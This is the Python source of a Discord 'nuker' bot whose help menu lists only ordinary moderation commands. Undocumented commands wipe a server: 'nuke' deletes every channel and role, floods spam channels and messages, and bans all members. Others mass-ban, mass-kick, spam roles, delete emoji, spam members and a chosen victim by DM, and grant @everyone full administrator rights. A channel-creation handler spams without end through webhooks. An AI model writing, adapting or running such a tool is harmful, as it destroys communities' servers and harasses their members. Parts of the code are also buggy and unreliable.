import time
import discord
import asyncio
import colorama
import json
import random
import os
import sys, requests
from dotenv import load_dotenv
from discord.ext import commands
from discord import Permissions
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from discord import Webhook, AsyncWebhookAdapter
from inputimeout import inputimeout, TimeoutOccurred
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from colorama import init, Fore

if sys.platform == 'linux':
	import simplejson as json
else:
	import json

# import from file
from modules.function_setup.setup import Crypt
from modules.function_setup.setup import consoleLog
from modules.spam import settings
from modules.spam import channel_names
from modules.spam import message_spam
from modules.spam import webhook_names
######################################setup########################################

Crypt = Crypt()

timeout = 6

load_dotenv()

settings['token'] = os.getenv('TOKEN')
settings['user_id'] = int(os.getenv('USER_ID'))
settings['prefix'] = os.getenv('PREFIX')

client = commands.Bot(command_prefix=settings['prefix'], intents = discord.Intents.all(), help_command=None)

###################################################################################
@client.event
async def on_ready():
	await changeStatus(None, settings['bot_status'])
	try:
		exit()
	except:
		pass
	if sys.platform == 'linux':
		os.system('clear')
	else:
		os.system('cls')
	await client.change_presence(activity=discord.Game(name= "Kawaii" ))#change this if you want
	print(f''' 
\x1B[38;2;41;128;185m 
 ▄▄▄     ▓██   ██▓ █    ██  ██▓   ▓██   ██▓
▒████▄    ▒██  ██▒ ██  ▓██▒▓██▒    ▒██  ██▒
▒██  ▀█▄   ▒██ ██░▓██  ▒██░▒██░     ▒██ ██░
░██▄▄▄▄██  ░ ▐██▓░▓▓█  ░██░▒██░     ░ ▐██▓░
 ▓█   ▓██▒ ░ ██▒▓░▒▒█████▓ ░██████▒ ░ ██▒▓░
 ▒▒   ▓▒█░  ██▒▒▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░  ██▒▒▒ 
  ▒   ▒▒ ░▓██ ░▒░ ░░▒░ ░ ░ ░ ░ ▒  ░▓██ ░▒░ 
  ░   ▒   ▒ ▒ ░░   ░░░ ░ ░   ░ ░   ▒ ▒ ░░  
	  ░  ░░ ░        ░         ░  ░░ ░     
		  ░ ░                      ░ ░     

\x1B[37m═══════════════════════════
Logged In As {client.user}
Type {settings["prefix"]}help To Begin Nuking (Just normal command)
Version: Free Beta v0.2
Token: \x1B[33m{settings["token"]}
\x1B[37mUser Id: \x1B[33m{settings["user_id"]}\x1B[37m
Prefix: \x1B[33m{settings["prefix"]}\x1B[37m
═══════════════════════════
''')

############################## Normal ########################################

######## Help #######
@client.command(name="help", aliases=['hp', 'Hp', 'HP'])
async def help(ctx, command=None):
	help_command = {'help_menu':f'''
```
𝗛𝗲𝗹𝗽 𝗠𝗲𝗻𝘂

- ban              <Ban User>

- unban            <Ban User> 

- kick             <Kick User> 

- ping             <Show Your Ping> 

- numberforyou     <Random Of Number For You>  

- createrole       <Create a Role>

- aesencrypt 	   <Aes Encrypt>

- aesdecrypt 	   <Aes Dencrypt>

- help             <Show This Message> [{settings["prefix"]}help]

Use {settings["prefix"]}help <command>
```
''',
'ban':f'```Usage: {settings["prefix"]}ban <user> <reason>```', 

'unban':f'```Usage: {settings["prefix"]}unban <user>```',

'kick':f'```Usage: {settings["prefix"]}kick <user> <reason>```',

'ping':f'```Usage: {settings["prefix"]}ping```',

'numberforyou':f'```Usage: {settings["prefix"]}numberforyou <min> <max>\nAliases: {settings["prefix"]}nfy```',

'nfy':f'```Usage: {settings["prefix"]}numberforyou <min> <max>\nAliases: {settings["prefix"]}nfy```',

'createrole':f'''```Usage: {settings["prefix"]}createrole <name> <color> <permissions>
Aliases: {settings["prefix"]}crole
```
''',
# Enc and Dec
'aesencrypt':f'''```
Usage: {settings["prefix"]}aesencrypt 
<mode> [hide/show]
<password> [AES key must be either 16, 24, or 32 bytes long]
<message> 

Aliases: {settings["prefix"]}enc

```''',

'aesdecrypt':f'```Usage: {settings["prefix"]}aesdecrypt <password> <message encrypted>\n Aliases: {settings["prefix"]}dec```',

'help':f'```Aliases: hp```'
}
	if command == None:
		await ctx.send(help_command['help_menu'])
	elif command == 'ban':
		await ctx.send(help_command['ban'])
	elif command == 'unban':
		await ctx.send(help_command['unban'])
	elif command == 'kick':
		await ctx.send(help_command['kick'])
	elif command == 'ping':
		await ctx.send(help_command['ping'])
	elif command == 'numberforyou':
		await ctx.send(help_command['numberforyou'])
	elif command == 'nfy':
		await ctx.send(help_command['nfy'])
	elif command == 'help':
		await ctx.send(help_command['help'])
	elif command == 'createrole':
		await ctx.send(help_command['createrole'])
	elif command == 'aesencrypt' or command == 'enc':
		await ctx.send(help_command['aesencrypt'])
	elif command == 'aesdecrypt' or command == 'dec':
		await ctx.send(help_command['aesencrypt'])

####### Ban #########
@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member:discord.Member, *,reason='No Reason!'):
	if member == None or member == ctx.message.author:
		await ctx.channel.send("You cannot ban yourself")
		return
	try:
		await member.send(f'You are banned from server {ctx.guild.name}\nReason: {reason}')
		await member.ban(reason=reason)
		await ctx.send(f'Ban Successfully {member}\nReason: {reason}')
		consoleLog(f'{member} was banned by {ctx.message.author}\nReason: {reason}')
	except:
		await ctx.send(f'Cant Found {member}')
		consoleLog(f'{Fore.YELLOW}{ctx.message.author} ban {member} but not found!')

######## Unban ########
@client.command()
@commands.has_permissions(administrator = True)
async def unban(ctx, *, member):
	banned_users = await ctx.guild.bans()
	member_name, member_discriminator = member.split("#")

	for ban_entry in banned_users:
		user = ban_entry.user

		if (user.name, user.discriminator) == (member_name, member_discriminator):
			await ctx.guild.unban(user)
			await ctx.send(f'Unbanned {user.mention}')
			consoleLog(f'{member} was unbanned by {ctx.message.author}')
			return

####### Kick #########
@client.command()
@commands.has_permissions(manage_roles = True, ban_members=True)
async def kick(ctx, member:discord.Member, *, reason='No Reason!'):
	if member == None or member == ctx.message.author:
		await ctx.channel.send("You cannot kick yourself")
		return
	try:
		await member.send(f'You are kicked from server {ctx.guild.name}\nReason: {reason}')
		await member.kick(reason=reason)
		await ctx.send(f'Kick Successfully {member}\nReason: {reason}')
		consoleLog(f'{member} was kicked by {ctx.message.author}\nReason: {reason}')
	except:
		await ctx.send(f'Cant Found {member}')
		consoleLog(f'{Fore.YELLOW}{ctx.message.author} kick {member} but not found!')

####### Ping #########
@client.command()
async def ping(ctx):
	before = time.monotonic()
	message = await ctx.send("Pong!")
	ping = (time.monotonic() - before) * 1000
	await ctx.send(f'{ctx.message.author}, your Ping is {int(ping)}ms !')

####### Number of Day #######
@client.command(name='Number for you', aliases=['nfy'])
async def numberforyou(ctx, minn:int=0, maxx:int=100):
	try:
		await ctx.send(f'{ctx.message.author}, your number: {random.randint(minn, maxx)}')
	except:
		await ctx.send(f'Have Error!')

####### Create Role ##########
@client.command(name='createrole', aliases=['crole'])
@commands.has_permissions(manage_roles=True)
async def createrole(ctx, name:str='New Role'):
	guild = ctx.guild
	await guild.create_role(name=name)
	await ctx.send(f'Role `{name}` has been created')

########## Aes Encrypt ############
@client.command(name="Aes Encrypt", aliases=['enc'])
async def aesencrypt(ctx, mode='hide', password:str='MyKey4TestingYnP', *, message):
	await ctx.message.delete()
	try:
		encrypt_message = Crypt.encrypt(message, password)
	except ValueError as value_error:
            if value_error.args[0] == 'IV must be 16 bytes long':
                raise ValueError('Encryption Error: SALT must be 16 characters long')
            elif value_error.args[0] == 'AES key must be either 16, 24, or 32 bytes long':
                raise ValueError('Encryption Error: Encryption key must be either 16, 24, or 32 characters long')
            else:
                raise ValueError(value_error)

	user = ctx.message.author
	embed=discord.Embed(title="Aes Encryption", color=0x00aaff)
	embed.set_thumbnail(url="https://lh6.googleusercontent.com/0jjt4P_YWGSoRFePVPm-aFtKU33jihV-o57ZFd0JmBo7VPCaMyBOPFrxaR6FMUSE9C-x7FcsmGHhrgVBxkVE=w1366-h626-rw")
	embed.add_field(name="Message: ", value=message, inline=True)
	embed.add_field(name="Password: ", value=password, inline=True)
	embed.add_field(name="Message Encrypt: ", value=encrypt_message, inline=False)
	if mode == 'show':
		await ctx.send(embed=embed)
	elif mode == 'hide':
		try:
			await user.send(embed=embed)
		except:
			await ctx.send('I cant DM you to send Encrypted Message for you!')


########## Aes Decrypt ############
@client.command(name="Aes Decrypt", aliases=['dec'])
async def aesdecrypt(ctx, password, *, message_enc):
	await ctx.message.delete()
	try:
		decrypt_message = Crypt.decrypt(message_enc, password)
	except ValueError as value_error:
            if value_error.args[0] == 'IV must be 16 bytes long':
                raise ValueError('Encryption Error: SALT must be 16 characters long')
            elif value_error.args[0] == 'AES key must be either 16, 24, or 32 bytes long':
                raise ValueError('Encryption Error: Encryption key must be either 16, 24, or 32 characters long')
            else:
                raise ValueError(value_error)

	user = ctx.message.author
	embed=discord.Embed(title="Aes Decryption", color=0x00aaff)
	embed.set_thumbnail(url="https://lh6.googleusercontent.com/0jjt4P_YWGSoRFePVPm-aFtKU33jihV-o57ZFd0JmBo7VPCaMyBOPFrxaR6FMUSE9C-x7FcsmGHhrgVBxkVE=w1366-h626-rw")
	embed.add_field(name="Message Encrypted: ", value=message_enc, inline=True)
	embed.add_field(name="Password: ", value=password, inline=True)
	embed.add_field(name="Message Decrypted: \n", value=decrypt_message, inline=False)
	await ctx.send(embed=embed)

############################# Nuke #########################################


@client.command(name='changeStatus', aliases=['cs'])
async def changeStatus(ctx, status):
	if status == 'offline':
		await client.change_presence(status=discord.Status.offline)
	elif status == 'invisible':
		await client.change_presence(status=discord.Status.invisible)
	elif status == 'online':
		await client.change_presence(status=discord.Status.online)
	elif status == 'idle':
		await client.change_presence(status=discord.Status.idle)
	elif status == 'dnd' or status == 'do_not_disturb':
		await client.change_presence(status=discord.Status.do_not_disturb)

######## Nuke ########
@client.command()
async def nuke(ctx, amount=50):
	await ctx.message.delete()
	await ctx.guild.edit(name="☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️")
	channels = ctx.guild.channels
	for channel in channels:
		try:
			await channel.delete()
			consoleLog(f"{channel.name} Has Been Successfully Deleted!")
		except:
			pass
			consoleLog(f"Unable To Delete Channel!", False)
			guild = ctx.message.guild
	for i in range(amount):
		try:  
			await ctx.guild.create_text_channel(random.choice(channel_names))
			consoleLog(f"Successfully Made Channel [{i}]!", True)
		except:
			consoleLog(f"Unable To Create Channel!", False)
	for role in ctx.guild.roles:
		try:
			await role.delete()
			consoleLog(f"{role.name}Has Been Successfully Deleted!")

		except:
			consoleLog(f" {role.name}Is Unable To Be Deleted", False)
	await asyncio.sleep(2)
	for i in range(100):  
		for i in range(1000):
			for channel in ctx.guild.channels:
				try:
					await channel.send(random.choice(message_spam))
					consoleLog(f"{channel.name} Has Been Spammed Message!")
				except:
					consoleLog(f"Unable To Spammed Message {channel.name}!", False)
	for member in ctx.guild.members:
		if member.id != settings['user_id'] or member != client.user:  
			try:
				await member.ban(reason= "☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️")
				consoleLog(f"{member.name}Has Been Successfully Banned In {ctx.guild.name}")
			except:
				consoleLog(f"Unable To Ban {member.name} In {ctx.guild.name}!", False)
		

@client.event
async def on_guild_channel_create(channel):
	while True:
		await channel.send(random.choice(message_spam))



@client.event
async def on_guild_channel_create(channel):
	webhook =await channel.create_webhook(name = random.choice(webhook_names))  
	while True:  
		await channel.send(random.choice(message_spam))
		await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))

@client.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.MissingRequiredArgument):
		await ctx.send('Please pass in all requirements :rolling_eyes:.')
	if isinstance(error, commands.MissingPermissions):
		await ctx.send("You dont have the permissions :angry:")


######## Ban #######
@client.command()
async def banall(ctx):
	await ctx.message.delete()
	for member in ctx.guild.members:
		if member.id == settings['user_id'] or member == client.uesr:
			pass
		else:
			try:
				await ctx.guild.ban(user)
				consoleLog(f"{member.name} Has Been Successfully Banned In {ctx.guild.name}")
			except:
				consoleLog(f"Unable To Ban {member.name} In {ctx.guild.name}!", False)
  

####### Kick ########
@client.command()
async def kickall(ctx):
	await ctx.message.delete()
	for member in ctx.guild.members:
		if member.id == settings['user_id'] or member == client.uesr:
			pass
		else:
			try:
				await member.kick(reason="☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️")
				consoleLog(f"{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
			except:
				consoleLog(f"Unable To Kick {member.name} In {ctx.guild.name}!", False)

###### Role Spam #######
@client.command()
async def rolespam(ctx):
	await ctx.message.delete()
	for i in range(1, 250):
		try:
			await ctx.guild.create_role(name=f"☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️")
			consoleLog(f"Successfully Created Role In {ctx.guild.name}!")
		except:
			consoleLog(f"Unable To Create Roles In {ctx.guild.name}!", False)

####### Emoji Delete #######
@client.command(pass_context=True)
async def emojidel(ctx):
	await ctx.message.delete()
	for emoji in list(ctx.guild.emojis):
		try:
			await emoji.delete()
			consoleLog(f"Successfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
		except:
			consoleLog(f"Unable To Delete Emoji {emoji.name} In {ctx.guild.name}!", False)

####### DM ########
@client.command()
async def dm(ctx, *, message:str):
	await ctx.message.delete()
	for user in list(ctx.guild.members):
		try:
			await user.send(message)
			consoleLog(f"DMed All Members In {ctx.guild.name}!")
		except:
		 	consoleLog(f"\x1b[38;5;196m[!] Unable To DM Members In {ctx.guild.name}!", False)

####### DM Spam #######
@client.command(name="dmspama", aliases=["dmspa"])
async def dmspamall(ctx, amount=50, *, message=None):
	await ctx.message.delete()
	for user in list(ctx.guild.members):
		if user.id == settings['user_id'] or user == client.user:
			pass
		else:
			if message == None:
				for _ in range(1, amount+1):
					try:
						await user.send(f'<@!{user.id}> \n{random.choice(message_spam)}')
						# print(f'<@!{user.id}> \n{random.choice(message_spam)}')
						consoleLog(f"Spamed {user} [{_}] in Server {ctx.guild.name}!")
					except:
						consoleLog(f"Unable To Spam {user} [{_}] In Server {ctx.guild.name}!", False)
						amount = 1
			else:
				for _ in range(1, amount+1):
					try:

						#print(f"{str(user)[0:str(user).index('#')]} \n[*] Message:\n{message}")
						await user.send(f"<@!{user.id}> \n{message}")
						consoleLog(f"Spamed {user} [{_}] In Server {ctx.guild.name}!")
					except:
						consoleLog(f"Unable To Spam {user} [{_}] In Server {ctx.guild.name}!", False)
						amount = 1

####### DMvic Spam #######
@client.command(name="dmvspama", aliases=["dmvspa", "dmv"])
async def dmvicspamall(ctx, amount=50, message='None', *, vic:discord.member.Member):
	await ctx.message.delete()
	user = vic
	if user.id == settings['user_id'] or user == client.user:
		pass
	else:
		if message == 'None':
			for _ in range(1, amount+1):
				try:
					await user.send(f'<@!{user.id}> \n{random.choice(message_spam)}')
					# print(f'<@!{user.id}> \n{random.choice(message_spam)}')
					consoleLog(f"Spamed {user} [{_}]! In Server {ctx.guild.name}")
				except:
					consoleLog(f"Unable To Spam {user} In Server {ctx.guild.name}!", False)
		else:
			for _ in range(0, amount):
				try:
					#print(f"{str(user)[0:str(user).index('#')]} \n[*] Message:\n{message}")
					await user.send(f"<@!{user.id}> \n{message}")
					consoleLog(f"{Fore.GREEN}Spamed {user} In {ctx.guild.name}!{Fore.RESET}")
				except:
					consoleLog(f"Unable To Spam {user} In {ctx.guild.name}!", False)

####### Give Admin Permission #########
@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
			 if role.name == '@everyone':
				  try:
					  await role.edit(permissions=Permissions.all())
					  consoleLog(f"Gave @everyone Admin In {ctx.guild.name}!") 
				  except:
					  consoleLog(f"Unable To Give @everyone Admin In {ctx.guild.name}!", False)

###### Off Status#######
@client.command(aliases=['offst'])
async def off_status(ctx):
	await ctx.message.delete()
	await changeStatus(None, settings['bot_status'])
	try:
		exit()
	except:
		pass
	# await client.logout()

####### Shutdown Bot ######
@client.command()
async def off(ctx):
	await ctx.message.delete()
	await changeStatus(None, settings['bot_status'])
	exit()
	# await client.logout()

@client.event
async def on_connect():
	await changeStatus(None, settings['bot_status'])


client.run(settings['token'])